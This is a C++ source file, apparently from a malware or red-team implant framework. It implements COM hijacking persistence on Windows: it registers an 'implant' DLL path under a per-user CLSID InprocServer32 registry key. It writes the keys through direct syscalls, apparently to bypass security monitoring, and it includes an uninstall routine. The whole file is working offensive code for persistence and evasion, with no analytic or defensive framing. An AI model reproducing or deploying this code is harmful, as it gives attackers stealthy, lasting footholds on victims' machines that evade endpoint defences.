#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <vector>
#include <sstream>

namespace persistence {

namespace {
    NTSTATUS NtCreateKeyRecursive(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, const std::wstring& fullPath) {
        auto& resolver = evasion::SyscallResolver::GetInstance();
        DWORD ntCreateKeySsn = resolver.GetServiceNumber("NtCreateKey");
        DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

        if (ntCreateKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return (NTSTATUS)0xC0000001;

        std::wstringstream ss(fullPath);
        std::wstring segment;
        std::wstring currentPath = L"";
        HANDLE hParent = NULL;
        NTSTATUS status = 0;

        // Skip initial empty segments if path starts with \
        // e.g. \Registry\User\...
        bool first = true;

        while (std::getline(ss, segment, L'\\')) {
            if (segment.empty() && first) {
                currentPath = L"\\";
                first = false;
                continue;
            }
            if (currentPath != L"\\") currentPath += L"\\";
            currentPath += segment;

            UNICODE_STRING uPath;
            uPath.Buffer = (PWSTR)currentPath.c_str();
            uPath.Length = (USHORT)(currentPath.length() * sizeof(wchar_t));
            uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

            HANDLE hKey = NULL;
            ULONG disp = 0;
            status = InternalDoSyscall(ntCreateKeySsn, &hKey, DesiredAccess, &objAttr, 0, NULL, 0, &disp);

            if (hParent) InternalDoSyscall(ntCloseSsn, hParent);

            if (!NT_SUCCESS(status)) return status;
            hParent = hKey;
        }

        *KeyHandle = hParent;
        return status;
    }
}

bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
    LOG_DEBUG("ComHijacker::Install started");

    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) {
        LOG_ERR("Failed to get current user SID");
        return false;
    }

    // Full NT path for HKCU\Software\Classes\CLSID\{...}\InprocServer32
    // Registry path: \Registry\User\<SID>\Software\Classes\CLSID\<CLSID>\InprocServer32
    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";

    LOG_DEBUG("Target NT Path: " + utils::ws2s(fullPath));

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    HANDLE hKey = NULL;
    NTSTATUS status = NtCreateKeyRecursive(&hKey, KEY_ALL_ACCESS, fullPath);

    if (NT_SUCCESS(status)) {
        LOG_DEBUG("NtCreateKeyRecursive successful");

        // Set default value (implant path)
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, 0, REG_SZ, (PVOID)implantPath.c_str(), (ULONG)((implantPath.length() + 1) * sizeof(wchar_t)));

        // Set ThreadingModel
        std::wstring tm = L"ThreadingModel";
        UNICODE_STRING uTm;
        uTm.Buffer = (PWSTR)tm.c_str();
        uTm.Length = (USHORT)(tm.length() * sizeof(wchar_t));
        uTm.MaximumLength = uTm.Length + sizeof(wchar_t);

        std::wstring tmVal = L"Both";
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, 0, REG_SZ, (PVOID)tmVal.c_str(), (ULONG)((tmVal.length() + 1) * sizeof(wchar_t)));

        InternalDoSyscall(ntCloseSsn, hKey);
        LOG_INFO("COM registration keys set via direct syscalls.");
        return true;
    } else {
        char buf[32];
        std::snprintf(buf, sizeof(buf), "0x%08X", (unsigned int)status);
        LOG_ERR("NtCreateKeyRecursive failed: " + std::string(buf));
    }

    return false;
}

bool ComHijacker::Uninstall(const std::wstring& clsid) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\Software\\Classes\\CLSID\\" + clsid;

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)fullPath.c_str();
    uPath.Length = (USHORT)(fullPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        // We should delete InprocServer32 first
        std::wstring subPath = fullPath + L"\\InprocServer32";
        UNICODE_STRING uSubPath;
        uSubPath.Buffer = (PWSTR)subPath.c_str();
        uSubPath.Length = (USHORT)(subPath.length() * sizeof(wchar_t));
        uSubPath.MaximumLength = uSubPath.Length + sizeof(wchar_t);

        OBJECT_ATTRIBUTES subAttr;
        InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hSubKey = NULL;
        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, KEY_ALL_ACCESS, &subAttr))) {
            InternalDoSyscall(ntDeleteKeySsn, hSubKey);
            InternalDoSyscall(ntCloseSsn, hSubKey);
        }

        status = InternalDoSyscall(ntDeleteKeySsn, hKey);
        InternalDoSyscall(ntCloseSsn, hKey);
    }

    return NT_SUCCESS(status);
}

} // namespace persistence
